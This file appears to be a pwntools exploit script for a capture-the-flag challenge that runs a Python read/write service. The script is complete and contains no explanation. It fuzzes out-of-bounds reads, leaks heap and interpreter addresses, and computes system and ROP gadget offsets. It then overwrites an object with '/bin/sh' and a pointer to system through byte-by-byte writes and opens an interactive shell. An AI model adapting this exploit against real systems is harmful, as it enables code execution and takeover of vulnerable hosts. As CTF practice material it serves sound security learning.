from pwn import *
r = 0
def fuzz():
    for i in range(8500,10500):
        try:
            #r = process("./rw.py")
            r = remote('127.0.0.1',1337)
            r.sendlineafter(b'>',b'w 16 255')
            r.sendlineafter(b'>',b'w 17 255')
            r.sendlineafter(b'>',b'r '+str(i).encode())
            l = r.recvline()
            if l and b'0x' in l :
                log.info(f"at {i} : {l}")
                pause()
            r.close()
        except EOFError:
            pass
def conn():
    if args.LOCAL:
        global local
        r =  process("./rw.py")
    else:
        r = remote('chal.2025.ductf.net',30004)
    return r
def w8(r,addr,obj_base,byte):
    off = addr-obj_base
    pl = b'w ' + str(off).encode() + b' '+str(byte).encode()
    r.sendlineafter(b'>', pl)
def w64(r,addr,obj_base,qword):
    for i in range(8):
        byte  = (qword>>(8*i))&0xff
        w8(r,addr+i,obj_base,byte)
#fuzz()
r = conn()

r.sendlineafter(b'>',b'w 16 255')
r.sendlineafter(b'>',b'w 17 255')
r.sendlineafter(b'>',b'r 340')
tl = r.recvline().strip()
l1 = int(tl.split()[2][:-1],16)
l2 = int(tl.split()[-1][:-1],16)
r.sendlineafter(b'>',b'r 706')
huh = r.recvline().strip()
bin_py = int(huh.split()[6],16)-0x571ba0
log.info(f"l1 -> {hex(l1)}")
log.info(f"l2 -> {hex(l2)}")
obj = l1+0x3c430
system_plt = bin_py+0x6f464
log.info(f"obj -> {hex(obj)}")
log.info(f"/bin/python - > {hex(bin_py)}")
log.info(f"system_plt at -> {hex(system_plt)}")
#bin_py 0x559a683f7acd : pop rsi ; pop rdi ; pop rdx ; ret
#0x557c04f875d5 : pop rax ; ret
#0x557c04f13329 : syscall
#0x55635115e14b : leave ; ret
#0x557bc2aa223a  jmp rdx
#0x55c36e62281d : mov rbp, rcx ; call qword ptr [rdi + 0x130] -> base: 0x55c36e36f000
#mov rbp, rdi ; push rbx ; mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x38]
gadget = bin_py+0x10dacd 
pop_rax = bin_py+0xf95d5
syscall = bin_py+0x85329
leave = bin_py+0x7e14b
jmp_rdx = bin_py+0x7123a
mov_rbp_rcx  = bin_py+0x2b381d

pause()
#w64(r,obj,obj,obj+24)
w64(r,obj,obj,u64(b'/bin/sh\x00'))
w64(r,obj+8,obj,(obj+16)-0xb8)
w64(r,obj+16,obj,system_plt)
r.sendlineafter(b'>',b'_ 0')

r.interactive()
